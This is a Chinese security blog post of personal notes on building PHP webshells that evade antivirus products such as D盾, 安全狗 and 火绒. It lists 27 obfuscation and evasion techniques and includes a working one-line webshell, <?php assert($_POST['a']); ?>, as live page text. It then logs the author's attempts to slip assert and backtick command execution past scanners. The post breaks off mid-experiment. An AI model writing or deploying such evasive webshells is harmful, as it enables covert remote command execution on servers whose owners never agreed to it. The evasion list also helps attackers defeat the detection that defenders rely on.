

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="CDxiaodong">
  <meta name="keywords" content="">
  
    <meta name="description" content="php12345678910111213先讲讲什么是大码 小马 小马拉大码 一句话木马C:\Users\e&amp;#x27;e&amp;#x27;t\Desktop\红队安全开发\免杀马的制作\php\备课先讲讲几个重要的php函数的作用C:\Users\e&amp;#x27;e&amp;#x27;t\Desktop\红队安全开发\免杀马的制作\php\备课然后讲讲几个shell脚本被杀的病因然后讲讲22个免杀方法然后讲讲手动">
<meta property="og:type" content="article">
<meta property="og:title" content="phpwebshell从基础到深入变种">
<meta property="og:url" content="http://example.com/2022/08/18/phpwebshell%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E6%B7%B1%E5%85%A5%E5%8F%98%E7%A7%8D/index.html">
<meta property="og:site_name" content="CD_blog">
<meta property="og:description" content="php12345678910111213先讲讲什么是大码 小马 小马拉大码 一句话木马C:\Users\e&amp;#x27;e&amp;#x27;t\Desktop\红队安全开发\免杀马的制作\php\备课先讲讲几个重要的php函数的作用C:\Users\e&amp;#x27;e&amp;#x27;t\Desktop\红队安全开发\免杀马的制作\php\备课然后讲讲几个shell脚本被杀的病因然后讲讲22个免杀方法然后讲讲手动">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141747763.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141748328.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141750589.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141750805.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141751524.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752088.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752469.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752970.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752750.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752852.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752499.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752234.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753775.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753569.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753432.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753350.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754556.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754514.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754417.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754900.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754298.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754438.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754282.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141755311.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141755585.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756897.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756088.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141756500.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141757427.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141757681.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141758714.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141758359.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759158.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759828.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759443.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759517.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759670.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759420.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141759863.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800010.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800287.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800344.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800977.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800299.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800599.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800213.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141800637.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231643426.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231729906.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231734653.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231736607.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231742999.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231754170.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232041211.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231953862.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231922869.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231946938.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205231951324.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232002424.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205232005344.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241604615.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241612509.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241614659.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205241634454.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111049430.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111049452.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111053866.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111054436.png">
<meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202208111059750.png">
<meta property="article:published_time" content="2022-08-17T16:00:00.000Z">
<meta property="article:modified_time" content="2023-02-20T10:31:00.000Z">
<meta property="article:author" content="CDxiaodong">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141747763.png">
  
  
  
  <title>phpwebshell从基础到深入变种 - CD_blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>CD_blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="phpwebshell从基础到深入变种"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-08-18 00:00" pubdate>
          August 18, 2022 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          14k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          117 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">phpwebshell从基础到深入变种</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">先讲讲什么是大码 小马 小马拉大码 一句话木马<br>C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\备课<br>先讲讲几个重要的php函数的作用<br>C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\备课<br>然后讲讲几个shell脚本被杀的病因<br>然后讲讲<span class="hljs-number">22</span>个免杀方法<br>然后讲讲手动免杀之路<br> <span class="hljs-number">1.</span>查病因并进行绕过 <span class="hljs-number">2.</span>根据网上的php免杀码进行拼接 <span class="hljs-number">3.</span>通过对上面<span class="hljs-number">22</span>个免杀方法的拼接 <span class="hljs-number">4.</span>自创 另辟蹊径 找寻独特的函数 或者新的php版本的函数  <br> <span class="hljs-number">5.</span>看到一些大佬的测试文章 但是没有提供木马 自己去写一个<br> <br> 最后讲讲后续<br> <span class="hljs-number">1.</span>讲讲常见webshell特征分析C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\免杀基础-常见Webshell特征分析.lnk<br> <span class="hljs-number">2.</span>C:\Users\<span class="hljs-string">e&#x27;e&#x27;</span>t\Desktop\红队安全开发\免杀马的制作\php\目录下的几个文章<br></code></pre></td></tr></table></figure>

<p>位置:C:\Users\e’e’t\Desktop\沙箱\被杀马\php\shell.php</p>
<p>Shell01.php</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141747763.png" srcset="/img/loading.gif" lazyload alt="image-20220514174741468"></p>
<p>这个特征感觉有两个</p>
<p>一个是主要的是时间问题，它是一个在野较长的冰蝎码（大概率是这个原因）</p>
<p>第二个是因为它利用的openssl的AES加密 再加上使用了eval函数，造成查杀？（小概率是这个原因）</p>
<p>Caidao01.php   C:\Users\e’e’t\Desktop\沙箱\被杀马\php\caidao01.php</p>
<p> <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141748328.png" srcset="/img/loading.gif" lazyload alt="image-20220514174805295"></p>
<p>这个码可以过d盾和安全狗。但是不能过火绒</p>
<p>但是火绒杀毒都不会说出问题在哪</p>
<p>我们先分析它</p>
<p>不再使用eval而改用assert。（这是个优点）</p>
<p>使用了destruct析构函数</p>
<p>析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</p>
<p>在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。</p>
<p>在 PHP 中析构函数并不是很常用，它属于类中可选的一部分，只有需要的时候才在类中声明。</p>
<p>所以这个函数可能是造成被杀的特征之一</p>
<p>Call_user_func和序列化和反序列化也是造成的原因之一</p>
<p>还有就是$_POST[]被完整写出来了，这个原因之一</p>
<p>然后套用一些最近好用的phpshell的方法</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//没时间将 只讲方法 让他们去百度<br>\<span class="hljs-number">1.</span> 就是加密解密、进制转换<br><br>\<span class="hljs-number">2.</span> 序列化反序列化<br><br>\<span class="hljs-number">3.</span> 用加密进行加壳<br><br>\<span class="hljs-number">4.</span> 自增、异或、取反<br><br>\<span class="hljs-number">5.</span> 取数组交集<br><br>\<span class="hljs-number">6.</span> 一些函数<br><br>uopz_function()<br><br>uasort()        使用用户自定义的比较函数对数组按键值进行排序<br><br>uksort()       和uasort（）一样，不过在输出的时候会进行每两个对调<br><br>array_uintersect_uassoc()  比较键值返回交集<br><br>array_udiff_assoc()    比较函数返回差集<br><br>array_map       <br><br>\<span class="hljs-number">7.</span> php反射机制获得注释的字符php<br><br>\<span class="hljs-number">8.</span> 回调函数  魔术方法__invoke制作回调函数<br><br>\<span class="hljs-number">9.</span> 缓存写webshell<br><br>\<span class="hljs-number">10.</span> 正则匹配绕过<br><br>\<span class="hljs-number">11.</span> 匿名函数<br><br>\<span class="hljs-number">12.</span> 函数取别名use <span class="hljs-keyword">function</span> \create_function <span class="hljs-keyword">as</span> a;<br><br>\<span class="hljs-number">13.</span> 利用数组转换需要的函数<br><br>\<span class="hljs-number">14.</span> 利用全局变量遍历获取想要全局变量<br><br>\<span class="hljs-number">15.</span> 利用自定义类加载<span class="hljs-built_in">public</span> <span class="hljs-keyword">function</span> payload()<br><br>\<span class="hljs-number">16.</span> https://www.php.net/manual/zh/<span class="hljs-keyword">language</span>.oop5.magic.php魔术方法<br><br>\<span class="hljs-number">17.</span> 远程文件包含GetShell，只要把webshell写入txt文件，远程包含一下就可以getshell<br><br>\<span class="hljs-number">18.</span> 设置环境变量存储关键参数<br><br>\<span class="hljs-number">19.</span> 变量覆盖 extract  parse_str<br><br>\<span class="hljs-number">20.</span> <span class="hljs-keyword">null</span> 拼接 <span class="hljs-string">&#x27;&#x27;</span> 拼接  <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">null</span> 拼接<br><br>\<span class="hljs-number">21.</span> 命令函数<span class="hljs-keyword">system</span>,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号),ob_start<br><br>\<span class="hljs-number">22.</span> 代码执行函数 Eval和<span class="hljs-keyword">Assert</span> substr()字符串变形 strtr() 函数转换字符串中特定的字符 函数绕过 把关键词当作参数选递<br><br>\<span class="hljs-number">23.</span> 类的继承机制<br><br>\<span class="hljs-number">24.</span>类型转换打断检测引擎正常执行<br><br>\<span class="hljs-number">25.</span>没死透的正则<br><br>\<span class="hljs-number">26.</span>phpyin<span class="hljs-string">&#x27;y</span><br><span class="hljs-string"></span><br><span class="hljs-string">\27.~(按位取反</span><br></code></pre></td></tr></table></figure>

<?php assert($_POST[‘a’]); ?>

<p>这里只用POST是因为POST兼容比较大。</p>
<p>像蚁剑就只兼容POST</p>
<p>escapeshellarg为密钥加‘’</p>
<p>首先我们要确定我们的执行命令函数</p>
<p>常见的eval和arrest肯定是不行的</p>
<p>可以使用反引号进行命令执行。但是这种方法需要受害机php关闭安全模式和打开shell_exec()</p>
<p>然后就是我们webshell中的拼接函数</p>
<p>选小众的就完事了</p>
<p>先试试uksort() </p>
<p>期间每一步操作我都是做一步查杀一下。做一步查杀一下。以防止特征查杀</p>
<p>当然我觉得没有。更多的是逻辑查杀</p>
<h2 id="①-通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。"><a href="#①-通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。" class="headerlink" title="①. *通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。*"></a><strong>①.</strong> <em><strong>*通过自增得到关键字，然后定义类，类内函数自调用来进行bypass。*</strong></em></h2><p>这里使用proc_open </p>
<p>可是proc_open使用较为困难</p>
<p>因为它是使用建立通道，再建立程序运行的方法。代码较为难写，</p>
<p>但就是这样，防杀能力更强</p>
<p>而且发现大部分市面上的webshell都没有使用proc_open这个函数</p>
<p>只可惜后面查阅发现proc_open这个函数适用于反弹shell</p>
<p>就没有办法作用于webshell了吗</p>
<p>我们写看一下proc_open的用法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141750589.png" srcset="/img/loading.gif" lazyload alt="image-20220514175031553"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141750805.png" srcset="/img/loading.gif" lazyload alt="image-20220514175045771"></p>
<p>这里有个疑惑点。这段代码使用的是直接输入命令ipconfig</p>
<p>而我们的目的是上传一个webshell，但是在这里的用法看来是主动运行命令。</p>
<p>这样的话我们确实可以利用这个去执行命令。</p>
<p>比如执行echo一个webshell到新的php文件。</p>
<p>但是这样有违我们的初衷。我们要做的是进行webshell的免杀。如果这样嵌套一个新的webshell的话。还需要对webshell进行免杀</p>
<p>那有没有做成webshell的方法吗？</p>
<p>暂时没找到方法</p>
<p>C:\Users\e’e’t\Desktop\沙箱\被杀马\php\1.php</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141751524.png" srcset="/img/loading.gif" lazyload alt="image-20220514175105475"></p>
<p>继续用我们的“22（代码执行函数）”吧</p>
<p>把上面哪个红框换成arrest或者eval</p>
<p>过狗还是相当容易的。但是过火绒不行</p>
<h2 id="①-可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行"><a href="#①-可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行" class="headerlink" title="①. *可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行*"></a><strong>①.</strong> <em><strong>*可以利用php的反射机制，获取注释的内容，然后拼凑出assert，从而动态执行*</strong></em></h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752088.png" srcset="/img/loading.gif" lazyload alt="image-20220514175157641">慢慢调试<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752469.png" srcset="/img/loading.gif" lazyload alt="image-20220514175216436"></p>
<p>接下来就是在_POST前加上$和在其后加上[‘a’]<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752970.png" srcset="/img/loading.gif" lazyload alt="image-20220514175225919"></p>
<p>接下来就是拼接调用<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752750.png" srcset="/img/loading.gif" lazyload alt="image-20220514175232715"></p>
<p>参考大佬 用到了@$assret($a&#x3D;$a);  $a&#x3D;$_POST[‘a’]<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752852.png" srcset="/img/loading.gif" lazyload alt="image-20220514175240798"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752499.png" srcset="/img/loading.gif" lazyload alt="image-20220514175248462"></p>
<p>火绒过了？</p>
<p>难以置信<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141752234.png" srcset="/img/loading.gif" lazyload alt="image-20220514175258189"></p>
<p>果然有问题</p>
<p>&#x3D;&#x3D;不能执行的话就别讲免杀了！！！&#x3D;&#x3D;</p>
<p>看看问题出现在哪</p>
<p>我感觉是@$assret($a&#x3D;$a);用不了了</p>
<p>现在我们可以肯定的是</p>
<p>$dd &#x3D; assert</p>
<p>$ee &#x3D; $_POST[‘a’]</p>
<p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753775.png" srcset="/img/loading.gif" lazyload alt="image-20220514175317743"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753569.png" srcset="/img/loading.gif" lazyload alt="image-20220514175321511"></p>
<p>我感觉是因为我在写的时候是没把它实例化出来</p>
<p>就是说得写个function去执行它</p>
<p>不然系统会认为它是个文本<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753432.png" srcset="/img/loading.gif" lazyload alt="image-20220514175353403"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141753350.png" srcset="/img/loading.gif" lazyload alt="image-20220514175359311"></p>
<p>有报错说明是好事</p>
<p>t_variable是PHP的一种内部标识，通常用在错误信息中。</p>
<p>出现该错误是因为在不该出现变量的地方出现了变量，或者变量名不合法。</p>
<p>就是说$dd后不能再加一个变量<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754556.png" srcset="/img/loading.gif" lazyload alt="image-20220514175411525"></p>
<p>再次访问<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754514.png" srcset="/img/loading.gif" lazyload alt="image-20220514175418482"></p>
<p>有点问题</p>
<p>直接改成$_REQUEST[‘x’]试试<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754417.png" srcset="/img/loading.gif" lazyload alt="image-20220514175426386"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754900.png" srcset="/img/loading.gif" lazyload alt="image-20220514175430862"></p>
<p>反引号无敌、用反引号试试<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754298.png" srcset="/img/loading.gif" lazyload alt="image-20220514175439263"></p>
<p>再加个print扰乱一下规则<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205141754438.png" srcset="/img/loading.gif" lazyload alt="image-20220514175446391"></p>
<p>&#x3D; &#x3D; &#x3D; &#x3D;&#x3D; &#x3D; &#x3D; &#x3D; &#x3D;&#x3D; &#x3D;&#x3D;  &#x3D;&#x3D;&#x3D; &#x3D; &#x3D; &#x3D; &#x3D;&#x3D; &#x3D;  &#x3D; </p>
<p>自闭</p>
<p>是不是我这个方法不对？</p>
<p>不能$dd和$ee只能用一个？</p>
<p>网上很多都是只用一个</p>
<p>那就写一个试试</p>
